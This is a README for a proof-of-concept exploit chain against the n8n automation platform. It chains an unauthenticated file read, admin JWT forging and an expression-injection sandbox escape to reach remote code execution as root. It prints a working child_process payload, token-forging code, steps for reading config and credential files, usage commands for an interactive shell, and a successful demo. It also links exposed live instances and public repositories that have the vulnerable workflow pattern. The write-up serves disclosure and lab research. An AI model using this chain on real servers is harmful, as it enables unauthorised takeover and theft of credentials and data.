# CVE-2026-21858 + CVE-2025-68613 - n8n Full Chain

**Unauthenticated Arbitrary File Read → Admin Token Forge → Sandbox Bypass → RCE**

| | |
|---|---|
| **CVE** | CVE-2026-21858 (AFR) + CVE-2025-68613 (RCE) |
| **CVSS** | 10.0 + 9.9 (Critical) |
| **Affected** | <= 1.65.0 (AFR) / >= 0.211.0 (RCE) |
| **Fixed** | 1.121.0 (AFR) / 1.120.4+ (RCE) |
| **Disclosed** | 2026-01-07 11:09 UTC |
| **Codename** | Ni8mare |
| **Credit** | Dor Attias (Cyera) |
| **Exploit** | [Chocapikk](https://github.com/Chocapikk/CVE-2026-21858) |
| **Process** | AI-automated: patch diff → repro → lab → exploit (~9h post-disclosure) |
| **Type** | Proof of Concept - NOT a universal exploit (requires specific workflow config, see [Limitations](#limitations)) |

## TL;DR

Full unauthenticated RCE chain on n8n:

1. **CVE-2026-21858** - Content-Type confusion → Arbitrary File Read
2. Read config + database → forge admin JWT
3. **CVE-2025-68613** - Expression injection → sandbox bypass → RCE

## Detection

The exposure is **version-based**. In terms of exposure, there are vulnerable n8n instances publicly accessible.

**LeakIX Results:** [View exposed instances](https://leakix.net/search?scope=leak&q=%2Btag%3Acve-2026-21858)

<p align="center">
  <img src="img/n8n.png" alt="LeakIX Detection Results">
</p>

## Why This Exploit?

This exploit was developed independently from the [Cyera write-up](https://www.cyera.com/research-labs/ni8mare-unauthenticated-remote-code-execution-in-n8n-cve-2026-21858) (discovered after completion). Key differences:

| | Cyera (Original Research) | This Exploit |
|---|---|---|
| **File Read** | Load into AI knowledge base → query via chat | Direct HTTP response |
| **Prerequisites** | Chat workflow + AI integration | **Any form with file upload** |
| **RCE Method** | "Execute Command" node (disabled by default) | **Expression Injection (works on default installs)** |
| **Automation** | Manual/conceptual demo | **Fully automated Python script** |

Both approaches require specific workflow configurations. Cyera needs chat + AI integration, this exploit needs a form with Respond node. See [Limitations](#limitations) for details.

## Attack Chain

```
┌───────────────────────────────────────────────────────────┐
│                     UNAUTHENTICATED                       │
├───────────────────────────────────────────────────────────┤
│  1. Read /proc/self/environ → Find HOME directory         │
│  2. Read $HOME/.n8n/config → Get encryptionKey            │
│  3. Read $HOME/.n8n/database.sqlite → Get admin creds     │
├───────────────────────────────────────────────────────────┤
│                      TOKEN FORGE                          │
├───────────────────────────────────────────────────────────┤
│  4. Derive JWT secret from encryptionKey                  │
│  5. Forge admin session cookie                            │
├───────────────────────────────────────────────────────────┤
│                    AUTHENTICATED RCE                      │
├───────────────────────────────────────────────────────────┤
│  6. Create workflow with expression injection             │
│  7. Sandbox bypass via this.process.mainModule.require    │
│  8. Execute arbitrary commands                            │
└───────────────────────────────────────────────────────────┘
```

## CVE-2026-21858 - Arbitrary File Read via Content-Type Confusion

### The Patch

```
commit c8d604d2c466dd84ec24f4f092183d86e43f2518
Author: mfsiega
Date:   Thu Nov 13 11:51:40 2025 +0100

    Merge commit from fork
```

The legendary **"Merge commit from fork"** - when you see this, someone found something spicy. 🌶️

### Root Cause

```javascript
// BEFORE (vulnerable)
const files = (context.getBodyData().files as IDataObject) ?? {};
await context.nodeHelpers.copyBinaryFile(file.filepath, ...)

// AFTER (fixed)
a.ok(req.contentType === 'multipart/form-data', 'Expected multipart/form-data');
```

Send `Content-Type: application/json` → control `filepath` → read any file.

## CVE-2025-68613 - Expression Injection RCE

### Why This Bypass?

n8n sandboxes user code (Code Node, expressions) using `vm2`/`isolated-vm`. Other RCE vectors:

| Technique | Status |
|-----------|--------|
| Execute Command Node | Disabled by default (`N8N_ALLOW_EXEC_COMMAND=false`) |
| SSH/HTTP Nodes | Execute on remote servers, not n8n host |
| Pyodide Sandbox Escape | CVE-2025-68668 - requires Python Code Node |
| **Expression Injection** | **CVE-2025-68613 - works on default installs** |

I used **Expression Injection** because it works on any n8n with default settings - no special nodes or config required. The Pyodide bypass (CVE-2025-68668) requires the Python Code Node which may not be available on all instances.

### The Payload

```javascript
={{ (function() { 
  var require = this.process.mainModule.require; 
  var execSync = require("child_process").execSync; 
  return execSync("id").toString(); 
})() }}
```

n8n expressions have access to `this.process.mainModule.require` → full sandbox escape.

### Token Forge

```python
# JWT secret derivation
jwt_secret = sha256(encryption_key[::2]).hexdigest()

# JWT hash
jwt_hash = b64encode(sha256(f"{email}:{password_hash}")).decode()[:10]

# Forge token
token = jwt.encode({"id": user_id, "hash": jwt_hash}, jwt_secret, "HS256")
```

## Lab Setup

```bash
docker compose up -d
# Wait ~60 seconds for setup
# Form: http://localhost:5678/form/vulnerable-form
# Creds: admin@exploit.local / ExploitLab123!
```

## Usage

```bash
# Read arbitrary file
uv run python exploit.py http://localhost:5678 /form/vulnerable-form --read /etc/passwd

# Full chain with command
uv run python exploit.py http://localhost:5678 /form/vulnerable-form --cmd "id"

# Interactive shell
uv run python exploit.py http://localhost:5678 /form/vulnerable-form
```

## Demo

```
╔═══════════════════════════════════════════════════════════════╗
║     CVE-2026-21858 + CVE-2025-68613 - n8n Full Chain          ║
║     Arbitrary File Read → Token Forge → Sandbox Bypass → RCE  ║
╚═══════════════════════════════════════════════════════════════╝

[*] Target: http://localhost:5678/form/vulnerable-form
[*] Version: 1.65.0 (VULN)
[x] HOME directory
[+] HOME directory: /root
[x] Encryption key
[+] Encryption key: yusrXZV1...
[x] Database
[+] Database: 1327104 bytes
[x] Admin user
[+] Admin user: admin@exploit.local
[x] Token forge
[+] Token forge: OK
[x] Admin access
[+] Admin access: GRANTED!
[+] Cookie: n8n-auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjljMWI5MzU0LTI5NzQtNGZlOS05OTc2LWVmZDM3ZWEyNWFlMiIsImhhc2giOiJGYzVQZjVkUDRxIn0.TrIjHV3_6pw6Syi4qme5larZeQElBJmo4Y_eSgL9_M0
[x] RCE
[+] RCE: OK

uid=0(root) gid=0(root) groups=0(root)
```

## Limitations

**This is NOT a "pwn any n8n" exploit.** It requires specific conditions to work:

| Requirement | Description |
|-------------|-------------|
| **Form with file upload** | Target must have a form workflow with a file upload field |
| **Respond to Webhook node** | Workflow must return the file content in HTTP response |
| **Workflow active** | The form workflow must be activated |
| **Unauthenticated access** | Form must be publicly accessible (no auth) |

**Example of vulnerable workflow configuration:**

```json
{
  "nodes": [
    {
      "name": "Form Trigger",
      "type": "n8n-nodes-base.formTrigger",
      "parameters": {
        "responseMode": "responseNode",
        "formFields": {
          "values": [{ "fieldLabel": "document", "fieldType": "file" }]
        }
      }
    },
    {
      "name": "Respond",
      "type": "n8n-nodes-base.respondToWebhook",
      "parameters": {
        "respondWith": "binary",
        "inputDataFieldName": "document"
      }
    }
  ],
  "connections": {
    "Form Trigger": { "main": [[{ "node": "Respond" }]] }
  }
}
```

The key elements are: `fieldType: "file"` + `respondWith: "binary"`. This pattern is common in file processing workflows (converters, image resizers, document processors).

**Works:**
- Forms with Respond node returning binary (file converters, processors)
- Default n8n installs (Expression Injection not blocked)
- Local/Docker deployments (database + config stored on disk)

**Doesn't work:**
- Forms without Respond node (file is read but content not returned in HTTP response)
- Forms requiring authentication
- n8n Cloud (different architecture, no local file access)
- Patched versions (>= 1.121.0)

**Note:** The vulnerability (arbitrary file read) is triggered regardless of exfiltration method. The Respond node is just one way to retrieve the content. Alternative methods (OOB, other output nodes) may work depending on workflow configuration.

**Blind exploitation:** If no respond node exists, the file is still read by n8n but cannot be exfiltrated via HTTP response. Alternative techniques (OOB, timing) would be needed.

## Real-world Examples

The vulnerable pattern (Form Trigger + file upload + Respond to Webhook) exists in public GitHub repositories.

**Note:** Popular n8n workflow repos (>100⭐) don't use this pattern. These are community/personal projects:

| Workflow File | File Fields | respondWith |
|---------------|-------------|-------------|
| [ifcpipeline/.../ifcpipeline.json](https://github.com/jonatanjacobsson/ifcpipeline/blob/main/example%20n8n%20workflows/%E2%9C%A8Getting%20Started_%20ifcpipeline.json) | IDS, IFC (x2) | `binary` ⚠️ |
| [nano-banana-studio/.../03_multi_asset_processor.json](https://github.com/Ghenghis/nano-banana-studio/blob/main/n8n/workflows/03_multi_asset_processor.json) | Images, Audio, Markdown | `json` |
| [ticket-omnichannel-chat/.../Knowledge_base.json](https://github.com/tiago123456789/ticket-omnichannel-chat/blob/main/n8n_automations/TicketOmnichannelChat___Knowledge_base.json) | Document(PDF) | `text` |
| [ai_resume_project/resume_rag.json](https://github.com/ggvoicu/ai_resume_project/blob/main/resume_rag.json) | File Upload | `allIncomingItems` |
| [fkgpt-portfolio/.../audio-transcription-analysis.json](https://github.com/musudik/fkgpt-portfolio/blob/main/src/n8n-workflows/audio-transcription-analysis.json) | Audio File | `text` |
| [n8n-backup/.../K3DwHQs0fnnm5UK0.json](https://github.com/trazonm/n8n-backup/blob/main/backup-2025/08/K3DwHQs0fnnm5UK0.json) | file | `text` |
| [voltixLandingPage/.../chatbotvoltix.json](https://github.com/CodingNeeds/voltixLandingPage/blob/main/n8nWorkflow/chatbotvoltix.json) | Upload File | default |
| [n8n-backup-zm/.../Ky1AiuIMbY1zoTLE.json](https://github.com/zlatkomq/n8n-backup-zm/blob/main/2025/11/Ky1AiuIMbY1zoTLE.json) | file | default |
| [8n8Workflows/.../3WoSqiBnZ56RtWMb.json](https://github.com/BigAddict/8n8Workflows/blob/main/workflows/3WoSqiBnZ56RtWMb.json) | Upload your document | default |
| [learn_earn_ai_insta/.../My workflow.json](https://github.com/bharathikalai/learn_earn_ai_insta/blob/main/chatgpt_rag/My%20workflow.json) | upload your file | default |
| [finintworkshop/.../API using n8n (ToT).json](https://github.com/rafliher/finintworkshop/blob/main/day4/API%20using%20n8n%20(ToT).json) | file | `json` |

These are **community-contributed workflows**. No official n8n.io templates use this vulnerable pattern.

## References

- [Vulhub Environment](https://github.com/vulhub/vulhub/tree/master/n8n/CVE-2025-68613) - Ready-to-use lab on Vulhub
- [Cyera Research - Ni8mare Full Write-up](https://www.cyera.com/research-labs/ni8mare-unauthenticated-remote-code-execution-in-n8n-cve-2026-21858) - Original research by Dor Attias
- [GHSA-v4pr-fm98-w9pg](https://github.com/n8n-io/n8n/security/advisories/GHSA-v4pr-fm98-w9pg) - CVE-2026-21858
- [GHSA-v98v-ff95-f3cp](https://github.com/n8n-io/n8n/security/advisories/GHSA-v98v-ff95-f3cp) - CVE-2025-68613
- [Nuclei Template CVE-2025-68613](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2025/CVE-2025-68613.yaml)
- [LeakIX Search Results](https://leakix.net/search?scope=leak&q=%2Btag%3Acve-2026-21858) - Exposed vulnerable instances
- [Formidable](https://github.com/node-formidable/formidable) - "The library, not the song" (thanks Cyera for the laugh)
